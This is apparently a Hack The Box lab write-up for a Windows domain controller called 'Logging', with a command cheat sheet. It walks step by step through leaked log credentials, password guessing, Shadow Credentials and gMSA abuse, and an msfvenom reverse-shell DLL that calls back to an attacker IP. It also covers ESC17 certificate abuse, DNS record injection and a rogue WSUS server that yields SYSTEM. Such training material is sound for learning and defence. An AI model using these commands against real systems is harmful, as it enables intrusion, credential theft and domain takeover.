> HTML Page: [[HTML Pages/HTB/HTB Logging.html|Open HTML Page]]

### Recon

#### Initial Scanning

The full-port nmap sweep finds 30 open TCP ports. A TTL of 127 on every port confirms a Windows host one hop away. The most immediately diagnostic ports are 88 (Kerberos), 389/636/3268/3269 (LDAP/LDAPS and Global Catalog), 53 (DNS), 445 (SMB), and 5985 (WinRM) — this is the standard fingerprint of a Windows Domain Controller. Ports 8530 and 8531 are left unidentified by nmap; these are the default HTTP and HTTPS ports for **Windows Server Update Services (WSUS)**, which becomes the final-stage exploitation surface. Recognising WSUS ports from the nmap output requires prior exposure to the technology; always check unfamiliar high-port pairs against known service port lists when scanning Windows targets:

bash

```bash
sudo nmap -p- --reason --min-rate 10000 10.129.245.130
sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,47001 -sCV 10.129.245.130
```

The LDAP certificate Subject Alternative Name reveals the domain (`logging.htb`) and the hostname (`DC01`). Importantly, nmap notes a **clock skew of +7 hours** — this is critical for any Kerberos operation, which requires clock synchronisation within 5 minutes. `sudo ntpdate dc01.logging.htb` must be run before any Kerberos-based authentication attempt, otherwise `KRB_AP_ERR_SKEW` errors will abort the operation mid-chain. SMB signing is enabled and required, which closes off relay attacks but is otherwise a normal DC configuration.

An efficient way to populate `/etc/hosts` on the attacker machine is to use `netexec`'s `--generate-hosts-file` flag and pipe the result into the existing hosts file:

bash

```bash
netexec smb 10.129.245.130 --generate-hosts-file hosts
cat hosts /etc/hosts | sudo sponge /etc/hosts
```

The resulting `/etc/hosts` entry should map the IP to both the FQDN and short name: `10.129.245.130 DC01.logging.htb logging.htb DC01`.

#### Credential Validation

The provided credentials are verified across multiple protocols. The key lesson here is that systematic protocol testing at the start of an assume-breach engagement defines the scope of what's immediately available:

bash

```bash
netexec smb dc01.logging.htb -u wallace.everette -p Welcome2026@
netexec ldap dc01.logging.htb -u wallace.everette -p Welcome2026@
netexec winrm dc01.logging.htb -u wallace.everette -p Welcome2026@
```

SMB and LDAP succeed; WinRM fails. This tells us the account is a basic domain user with no remote management capability — as expected from the "low privileged" scenario description.

#### BloodHound Data Collection

`RustHound-CE` is used for BloodHound CE data collection. Unlike the classic Python-based SharpHound or BloodHound.py, RustHound-CE is a single Rust binary with no dependencies and is fast:

bash

```bash
rusthound-ce -d logging.htb -u wallace.everette -p 'Welcome2026@' --zip -c All
```

This produces a zip containing all 14 users, 65 groups, 1 computer, 1 domain, 34 certificate templates, and 1 Enterprise CA — uploaded directly into the BloodHound CE web UI for graph analysis. Marking `wallace.everette` as owned immediately and checking "Outbound Object Control" in BloodHound shows no useful edges from this user, directing attention toward SMB shares and ADCS as the initial lateral paths.

---

### Stage 1: Credential Discovery and Kerberos-Only Account

#### SMB Share Enumeration

Enumerating SMB shares as the provided user reveals two non-standard shares beyond the usual DC defaults:

bash

```bash
netexec smb dc01.logging.htb -u wallace.everette -p Welcome2026@ --shares
```

The `Logs` share has read access and contains four log files. The `WSUSTemp` share is listed but inaccessible with current credentials. All four log files are retrieved in bulk using `smbclient` with the `prompt off` and `mget *` commands:

bash

```bash
smbclient //dc01.logging.htb/Logs -U wallace.everette%Welcome2026@
smb: \> prompt off
smb: \> mget *
```

#### Credential Disclosure in Application Log

The `IdentitySync_Trace_20260219.log` file is the key artefact. It is a trace log from a scheduled identity synchronisation service that crashed mid-execution in February 2026. At the point of failure, the application dumped its connection context — including plaintext credentials — to the log at VERBOSE level:

```
[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: 
{ Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
```

The subsequent error message confirms the password was already invalid when the crash occurred:

```
Server error: ... data 52e ... Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
```

This is a realistic pattern: VERBOSE-level logging, intended to be disabled in production, captures connection context including credentials; the log rotation scheme moved the file to a network share accessible by all domain users; and by the time the crash is noticed (February 2026), the password has already been rotated. The log file is stale evidence of the _previous_ credential.

#### Status Code Interpretation and Password Guessing

Attempting the leaked credential over NTLM and Kerberos returns different, informationally distinct error codes:

bash

```bash
# NTLM attempt — STATUS_ACCOUNT_RESTRICTION despite any password
netexec smb dc01.logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025'

# Kerberos attempt — KDC_ERR_PREAUTH_FAILED confirms the password is wrong
netexec smb dc01.logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025' -k
```

This is a critical analytical distinction. `STATUS_ACCOUNT_RESTRICTION` from NTLM means the password was accepted by the authentication stack but blocked by policy — the password itself is correct, but NTLM is restricted for this account. `KDC_ERR_PREAUTH_FAILED` from Kerberos definitively means the password is wrong. Together these tell a precise story: NTLM is disabled for `svc_recovery`, and the 2025 password is expired. Since the password was hardcoded with a year suffix and recently rotated, incrementing the year is the obvious next guess:

bash

```bash
# Kerberos with incremented password
netexec smb dc01.logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026' -k
# Returns: [+] logging.htb\svc_recovery:Em3rg3ncyPa$$2026
```

NTLM still returns `STATUS_ACCOUNT_RESTRICTION` with the correct 2026 password — confirming again that NTLM is disabled for this account, not that the password is wrong. Every Kerberos operation against this account going forward must use the `-k` flag.

---

### Stage 2: GenericWrite → gMSA → Shell as MSA_HEALTH$

#### BloodHound Analysis of svc_recovery

BloodHound shows that `svc_recovery` has **`GenericWrite`** over the `MSA_HEALTH$` machine account. `MSA_HEALTH$` is a member of **Remote Management Users**, meaning a shell over WinRM is available if the account can be compromised. `GenericWrite` is a powerful AD permission that opens multiple exploitation paths.

#### Path A: Shadow Credentials (Fastest)

A Shadow Credential attack works by writing an attacker-controlled certificate into the target account's `msDS-KeyCredentialLink` attribute, which Active Directory then accepts as a valid PKINIT (certificate-based) authentication credential. This attribute is writable with `GenericWrite`. `bloodyAD` handles the entire operation in a single command that generates the key pair, writes the credential, uses PKINIT to authenticate, and returns the NT hash:

bash

```bash
bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026' -k \
  add shadowCredentials 'MSA_HEALTH$'
# Returns: NT: 603fc24ee01a9409f83c9d1d701485c5
```

The resulting NT hash is immediately usable for Pass-the-Hash:

bash

```bash
netexec smb DC01.logging.htb -u 'MSA_HEALTH$' -H 603fc24ee01a9409f83c9d1d701485c5 -k
evil-winrm-py -i DC01.logging.htb -u 'MSA_HEALTH$' -H 603fc24ee01a9409f83c9d1d701485c5
```

#### Path B: gMSA Password Membership Manipulation

`MSA_HEALTH$` is a **Group Managed Service Account (gMSA)** — a special AD account type where Active Directory generates and rotates the password automatically, and authorized accounts can retrieve it on-demand. The authorization list is stored in the `msDS-GroupMSAMembership` attribute as a security descriptor. Since `svc_recovery` has `GenericWrite` over the account, it can overwrite this attribute to add itself to the authorized reader list.

Verifying the current state shows no accounts are permitted to read the gMSA password:

bash

```bash
ldapsearch -x -H ldap://dc01.logging.htb -D 'wallace.everette@logging.htb' -w 'Welcome2026@' \
  -b 'CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb' \
  objectClass msDS-ManagedPasswordId msDS-GroupMSAMembership sAMAccountType
```

The `msDS-GroupMSAMembership` field comes back empty. To add `svc_recovery` to the reader list, the attribute is set to an SDDL security descriptor:

```
O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-4020823815-2796529489-1682170552-2104)
```

The SDDL breaks down as: owner is Built-in Administrators (`O:S-1-5-32-544`); DACL contains one Allow ACE (`A`) granting full access rights (`0xf01ff`) to `svc_recovery`'s SID (RID 2104 from the domain SID). svc_recovery's SID is obtained from BloodHound:

bash

```bash
bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026' -k \
  set object 'MSA_HEALTH$' msDS-GroupMSAMembership \
  -v 'O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-4020823815-2796529489-1682170552-2104)'
```

A newer version of `bloodyAD` (from the GitHub main branch, post-v2.5.4) wraps this into a single clean command:

bash

```bash
# Install from main branch
uv tool install https://github.com/CravateRouge/bloodyAD.git

bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026' -k \
  add gmsaGroup 'msa_health$' svc_recovery
# Returns: msDS-ManagedPassword.NT: 946b33cc5505890cea9a4b5605b8cbd6
```

Either way, the recovered NT hash is used for WinRM access:

bash

```bash
evil-winrm-py -i DC01.logging.htb -u 'MSA_HEALTH$' -H <NT_hash>
```

---

### Stage 3: DLL Hijack via Insecure Auto-Updater → Shell as jaylee.clifton

#### UpdateMonitor Scheduled Task Analysis

As `MSA_HEALTH$`, enumeration of the file system surfaces `monitor.ps1` in the user's Documents folder, which queries a scheduled task named "UpdateChecker Agent". Inspecting the task directly using COM reveals it runs every 3 minutes as the user with SID `S-1-5-21-4020823815-2796529489-1682170552-2105`. Resolving that SID via `lookupsid.py` (Impacket) confirms it is `jaylee.clifton`:

bash

```bash
lookupsid.py logging.htb/wallace.everette:'Welcome2026@'@10.129.245.130
```

The task runs `C:\Program Files\UpdateMonitor\UpdateMonitor.exe` with arguments `500 /scan=3 /autofix=true`.

#### Reversing UpdateMonitor.exe

The binary is identified as a .NET assembly (`file UpdateMonitor.exe` shows `Mono/.Net assembly`), suitable for decompilation with **DotPeek**. The decompiled `Main` method reveals a crude update mechanism:

1. If `C:\ProgramData\UpdateMonitor\Settings_Update.zip` exists, delete the existing `C:\Program Files\UpdateMonitor\bin\settings_update.dll` and extract the zip into the `bin\` directory.
2. Load the resulting DLL with `LoadLibrary(str4)`.

`LoadLibrary` executes the DLL's `DllMain` entry point synchronously, meaning any shellcode placed in `DllMain` runs immediately when the update is processed — as `jaylee.clifton` — without any further interaction. The `C:\ProgramData\UpdateMonitor\` directory is world-writable for domain users (`BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)`), making this a textbook DLL hijacking via insecure auto-update.

#### Crafting and Delivering the Malicious Update

The correct DLL architecture must be determined first. The `UpdateMonitor.exe` is a 32-bit PE assembly (`PE32 executable`), so `LoadLibrary` will attempt to load a 32-bit DLL. Generating a 64-bit DLL causes `Error code: 193` (`ERROR_BAD_EXE_FORMAT`):

bash

```bash
# Incorrect - 64-bit payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.243 LPORT=443 -f dll -o settings_update.dll

# Correct - 32-bit payload matching the 32-bit host process
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.243 LPORT=443 -f dll -o settings_update.dll
```

Package the DLL into a zip with the expected name and upload it:

bash

```bash
zip Settings_Update.zip settings_update.dll
# Upload via evil-winrm-py
evil-winrm-py PS> upload Settings_Update.zip Settings_Update.zip
```

A critical file permissions step: the zip was created from the `MSA_HEALTH$` shell, so `jaylee.clifton` has no read access on it. The update mechanism will fail with `Access denied` when attempting to open the zip. Fix this by granting explicit read rights before the next scheduled run:

powershell

```powershell
icacls Settings_Update.zip /grant "logging\jaylee.clifton:R"
```

When the scheduled task fires (within 3 minutes), the DLL is extracted, loaded, and `DllMain` executes the reverse shell payload:

bash

```bash
rlwrap -cAr nc -lnvp 443
# Receives shell as jaylee.clifton
```

---

### Stage 4: ESC17 Certificate Template Abuse

#### Extracting a TGT from the Reverse Shell

The reverse shell gives command execution as `jaylee.clifton` but no password or hash. To use `certipy` from the attacker machine, a valid TGT is needed. **Rubeus** `tgtdeleg` extracts a delegated TGT using the Kerberos GSS-API from the current user's active session without requiring the password:

powershell

```powershell
.\Rubeus.exe tgtdeleg /nowrap
# Returns base64-encoded kirbi ticket
```

The base64 ticket is decoded and converted to CCACHE format using `ticketConverter.py` from Impacket:

bash

```bash
echo "<base64_ticket>" | base64 -d > jaylee.clifton.kirbi
ticketConverter.py jaylee.clifton.kirbi jaylee.clifton.ccache
```

#### Identifying ESC17 with Certipy

With the CCACHE ticket, `certipy` is invoked with Kerberos authentication to enumerate vulnerable certificate templates visible to jaylee.clifton's group memberships:

bash

```bash
KRB5CCNAME=jaylee.clifton.ccache certipy find -k -target DC01.logging.htb -ca logging-DC01-CA -vulnerable -stdout
```

The output identifies the `UpdateSrv` template as vulnerable to **ESC17**: the template is configured with `EnrolleeSuppliesSubject` (the requestor can specify an arbitrary Subject/SAN) and `Extended Key Usage: Server Authentication`. The IT group has enrollment rights. This means a member of IT can request a TLS certificate with any DNS name in the Subject Alternative Name field — including the name of an internal server they don't control.

**ESC17 in context:** ESC1 allows a user to impersonate _any user_ via UPN in the SAN. ESC17 is the server-focused analogue: it allows a user to impersonate _any server_ via DNS name in the SAN. The resulting certificate is trusted by domain-joined machines as authenticating the named server, enabling TLS impersonation of internal services that domain machines will connect to. WSUS is the ideal target here because domain members are explicitly configured to download updates from it, periodically initiating new TLS connections without user involvement.

#### Requesting the WSUS Certificate

The certificate is requested using `certipy req` with the `-dns` flag to specify the impersonated server name:

bash

```bash
KRB5CCNAME=jaylee.clifton.ccache certipy req -k -target DC01.logging.htb \
  -ca logging-DC01-CA -template UpdateSrv -dns wsus.logging.htb
# Saves certificate to wsus.pfx

openssl pkcs12 -in wsus.pfx -nodes -passin pass: -out wsus.pem
```

The `Certificate has no object SID` warning from certipy is harmless in this context — object SIDs matter for user authentication certificates (where the SID maps to an AD principal for authorization), but this certificate is purely for TLS server authentication where only the DNS name matters for the trust check.

---

### Stage 5: Rogue WSUS Server → Domain Administrator

#### Establishing DNS Control

BloodHound and `bloodyAD` together confirm that `jaylee.clifton` has `CREATE_CHILD` permission over the DNS zone in AD:

bash

```bash
KRB5CCNAME=jaylee.clifton.ccache bloodyAD --host dc01.logging.htb -d logging.htb -k get writable
# Shows: DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones ... permission: CREATE_CHILD
```

A new A record for `wsus.logging.htb` is added pointing at the attacker's IP:

bash

```bash
KRB5CCNAME=jaylee.clifton.ccache bloodyAD --host dc01.logging.htb -d logging.htb -k \
  add dnsRecord 'wsus' 10.10.15.243
```

Verification from the Windows shell confirms DNS resolves correctly:

powershell

```powershell
nslookup wsus.logging.htb
# Returns: Address: 10.10.15.243
```

Reading the Windows Update registry key on the DC confirms the machine is still configured to use the now-hijacked hostname:

powershell

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
# WUServer: https://wsus.logging.htb:8531
```

#### Running the Rogue WSUS Server

**`wsuks`** is used to host the fake WSUS server. The WSUS hijack technique works as follows: Windows Update clients send HTTP/SOAP requests to the configured WSUS server to sync update metadata. `wsuks` intercepts these requests and responds with metadata describing a fake update whose payload is `PsExec64.exe` — Microsoft's own signed remote execution utility, which passes Windows' code-signing verification for updates. The DC downloads and executes `PsExec64.exe` as SYSTEM, passing attacker-controlled arguments. The net result is arbitrary command execution as SYSTEM on the target machine initiated through the Windows Update mechanism:

bash

```bash
sudo wsuks -t DC01.logging.htb \
  --WSUS-Server wsus.logging.htb \
  --tls-cert wsus.pem \
  -I tun0 \
  --serve-only \
  -c '/accepteula /s cmd /k "net localgroup administrators /add wallace.everette"'
```

The `-c` value is the argument string passed to `PsExec64.exe` (not a raw command), hence the leading `/accepteula /s cmd /k` PsExec syntax. The SYSTEM context executes the `net localgroup administrators /add wallace.everette` command, elevating the initial assume-breach user to local administrator on the DC.

After the WSUS request cycle completes (visible in the `wsuks` output showing GET requests for `PsExec64.exe` and a final ReportEventBatch POST), the access level is verified:

bash

```bash
netexec smb dc01.logging.htb -u wallace.everette -p Welcome2026@
# Returns: (Pwn3d!) — confirms administrative access
```

A WinRM shell as the now-privileged user:

bash

```bash
evil-winrm-py -i DC01.logging.htb -u wallace.everette -p Welcome2026@
```

Or a SYSTEM shell via `psexec.py`:

bash

```bash
psexec.py logging/wallace.everette:'Welcome2026@'@DC01.logging.htb
# whoami: nt authority\system
```

---

### Key Lessons for the Analyst

**Application logs are first-class credential sources and must be treated as sensitive data.** The IdentitySync log in this box printed a full connection context dump including plaintext credentials at VERBOSE severity, which is common practice in enterprise software for debugging. The security failure was leaving that log on a world-readable SMB share. In real engagements, hunting through application logs, configuration files, and debug outputs for credential strings (`pass`, `password`, `bind`, `secret`, `token`, `key`) is always a high-yield activity on any share with read access.

**Error code discrimination between NTLM and Kerberos is an analytical superpower.** `STATUS_ACCOUNT_RESTRICTION` from NTLM and `KDC_ERR_PREAUTH_FAILED` from Kerberos are not the same error. The first means the password is correct but the auth method is blocked; the second means the password is wrong. Running both `-k` (Kerberos) and NTLM variants when testing credentials tells you precisely what's happening and avoids false negatives. Any account returning `STATUS_ACCOUNT_RESTRICTION` under NTLM should immediately be retested with `-k`.

**Year-suffixed passwords are an extremely common rotation pattern in enterprise environments.** Service accounts managed by humans (rather than vaults) almost universally follow patterns like `ServiceName2025!` → `ServiceName2026!`. When a log file leaks a dated password that's no longer valid, the first guess is always the current year increment. This is a realistic, non-CTF pattern observed in real penetration tests and red team engagements.

**`GenericWrite` over a gMSA enables two independent exploitation paths: Shadow Credentials and membership manipulation.** Shadow Credentials is faster because `bloodyAD` handles key generation, attribute write, PKINIT auth, and hash extraction in one command. The gMSA membership path requires knowing the target account is a gMSA and manually constructing an SDDL descriptor, but newer versions of `bloodyAD` expose a clean `add gmsaGroup` command. Both paths are worth knowing because environmental restrictions (PKINIT disabled, certificate services unavailable) may make one path inaccessible while the other remains viable.

**DLL architecture mismatches produce distinct, diagnosable error codes.** `Error code: 193` (`ERROR_BAD_EXE_FORMAT`) from `LoadLibrary` is precisely the "wrong bitness" error — a 64-bit DLL loaded into a 32-bit process or vice versa. Always check the target process architecture before generating DLL payloads with `msfvenom`. A 32-bit host binary (`PE32 executable`) requires `windows/shell_reverse_tcp` (32-bit), not `windows/x64/shell_reverse_tcp`.

**File ownership and permissions govern execution when lateral movement crosses user boundaries.** When an `MSA_HEALTH$` shell uploads a file that `jaylee.clifton` needs to read (the zip), the file's DACL inherits from the upload context — jaylee gets denied. This pattern applies whenever a lower-privileged runner picks up files created by a higher-privileged (or simply different) account. Always audit ACLs on files involved in cross-user execution chains and grant explicit access as needed.

**ESC17 is the server-impersonation analogue to ESC1's user impersonation.** The critical difference is in the Extended Key Usage: ESC1 targets templates with Client Authentication EKU (certificates that authenticate users); ESC17 targets templates with Server Authentication EKU (certificates that authenticate servers). Both require `EnrolleeSuppliesSubject`. In AD environments with ADCS, certificate templates should be audited for the combination of `EnrolleeSuppliesSubject` + Server Authentication EKU + enrollment rights for non-admin groups.

**WSUS hijacking is a legitimate, non-CVE attack technique against any domain configured to use a WSUS server.** The attack requires: (1) DNS control to redirect the WSUS hostname; (2) a valid TLS certificate for that hostname trusted by the domain (ESC17 provides this without needing CA compromise); (3) a rogue WSUS server that serves `PsExec64.exe` (a Microsoft-signed binary) as a fake update. The key insight is that WSUS clients verify update _signatures_ (Microsoft's code signing), not the _source_ of the update beyond TLS hostname validation. Controlling the TLS certificate for the WSUS hostname is therefore sufficient to impersonate the entire update infrastructure. In real environments, WSUS hostnames should use certificate pinning and DNS should be protected against authenticated user write access.

**`bloodyAD`'s `get writable` command surfaces DNS write access that would otherwise require deep ACL analysis.** Checking `CREATE_CHILD` on DNS zones as part of post-exploitation enumeration (`bloodyAD -k get writable`) should be standard practice on AD assessments — DNS write access for authenticated users is a common misconfiguration that unlocks both WSUS hijacking and general internal service spoofing.

---

### Tools & Cheat Sheet

|Tool|Purpose in this box|Key command / flag|
|---|---|---|
|`nmap`|Full-port scan; service detection; clock skew detection for Kerberos; WSUS port identification|`nmap -p- --reason --min-rate 10000 <ip>` → `nmap -p <ports> -sCV <ip>`|
|`netexec`|Hosts file generation; credential validation across SMB/LDAP/WinRM; share enumeration; user listing; `(Pwn3d!)` admin check; gMSA enumeration with `--gmsa`|`netexec smb <target> --generate-hosts-file hosts` / `netexec smb <target> -u <user> -p <pass> -k` / `netexec ldap <target> -u <user> -p <pass> -k --gmsa`|
|`ntpdate`|Synchronise clock before Kerberos operations; required when nmap reports clock skew|`sudo ntpdate dc01.logging.htb`|
|`rusthound-ce`|BloodHound CE data collection from Linux; single binary, no dependencies|`rusthound-ce -d logging.htb -u <user> -p '<pass>' --zip -c All`|
|`smbclient`|Share access; bulk file download|`smbclient //<host>/Logs -U <user>%<pass>` → `prompt off` → `mget *`|
|`lookupsid.py`|Brute-force domain SID enumeration; resolve SIDs from scheduled tasks or BloodHound to usernames|`lookupsid.py logging.htb/<user>:'<pass>'@<ip>`|
|`bloodyAD`|`GenericWrite` exploitation: Shadow Credentials, gMSA membership, DNS record creation, writable object enumeration|`bloodyAD --host <dc> -d <domain> -u <user> -p '<pass>' -k add shadowCredentials '<target>'` / `add gmsaGroup '<gmsa>' <user>` / `add dnsRecord 'wsus' <ip>` / `get writable`|
|`ldapsearch`|Manual LDAP attribute queries; verify gMSA `msDS-GroupMSAMembership` state|`ldapsearch -x -H ldap://<dc> -D '<user>@<domain>' -w '<pass>' -b '<DN>' <attrs>`|
|`evil-winrm-py`|WinRM shell using NT hash (Pass-the-Hash) or password; Python reimplementation of evil-winrm|`evil-winrm-py -i <target> -u '<user>' -H <NT_hash>`|
|`Rubeus.exe`|`tgtdeleg`: extract a TGT from an active session without knowing the password, using GSS-API delegation|`.\Rubeus.exe tgtdeleg /nowrap`|
|`ticketConverter.py`|Convert Kerberos `.kirbi` ticket (base64 decoded) to `.ccache` format for Linux tools|`ticketConverter.py jaylee.clifton.kirbi jaylee.clifton.ccache`|
|`msfvenom`|Generate 32-bit DLL reverse shell payload for DLL hijack; architecture must match host process|`msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o settings_update.dll`|
|`icacls`|Verify or grant file/directory permissions on Windows; diagnose cross-user access denied errors|`icacls Settings_Update.zip /grant "logging\jaylee.clifton:R"`|
|DotPeek|Decompile .NET assemblies to C# source; identify DLL loading paths and update mechanisms|GUI — open `UpdateMonitor.exe`, browse `Program.Main()`|
|`certipy`|ADCS enumeration and ESC17 exploitation; `find -vulnerable` identifies misconfigured templates; `req -dns` requests certificate with arbitrary SAN|`certipy find -k -target <dc> -vulnerable -stdout` / `certipy req -k -target <dc> -ca <ca-name> -template UpdateSrv -dns wsus.logging.htb`|
|`openssl`|Convert `.pfx` certificate to `.pem` format for wsuks|`openssl pkcs12 -in wsus.pfx -nodes -passin pass: -out wsus.pem`|
|`wsuks`|Host a rogue WSUS server; delivers `PsExec64.exe` as a signed update with attacker-controlled arguments|`sudo wsuks -t <dc> --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0 --serve-only -c '/accepteula /s cmd /k "net localgroup administrators /add <user>"'`|
|`psexec.py`|Remote SYSTEM shell via SMB after achieving local admin; uses write-to-ADMIN$ service creation|`psexec.py logging/<user>:'<pass>'@<dc>`|
|`feroxbuster`|Web directory brute force on IIS; useful to verify no hidden web content before pivoting away|`feroxbuster -u http://logging.htb`|
|`rlwrap`|Wrap `nc` listener to add readline history and arrow keys for the raw Windows reverse shell|`rlwrap -cAr nc -lnvp 443`|